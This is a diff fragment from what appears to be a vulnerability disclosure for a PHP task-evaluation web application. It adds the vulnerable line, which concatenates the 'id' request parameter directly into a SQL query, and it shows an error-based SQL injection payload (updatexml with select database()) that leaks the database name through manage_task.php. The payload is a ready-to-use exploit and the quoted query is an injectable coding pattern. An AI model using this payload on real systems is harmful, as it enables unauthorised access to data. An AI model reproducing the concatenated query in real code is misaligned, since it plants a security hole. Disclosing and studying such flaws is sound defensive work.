@@ -12,6 +12,8 @@ Vulnerability File: /eval/admin/manage_task.php?id=
 
 Vulnerability location: /eval/admin/manage_task.php?id=, id
 
+Vulnerability sql: `$qry = $conn->query("SELECT * FROM task_list where id = ".$_GET['id'])->fetch_array();` 
+
 dbname =evaluation_db
 
 [+] Payload: /eval/admin/manage_task.php?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id
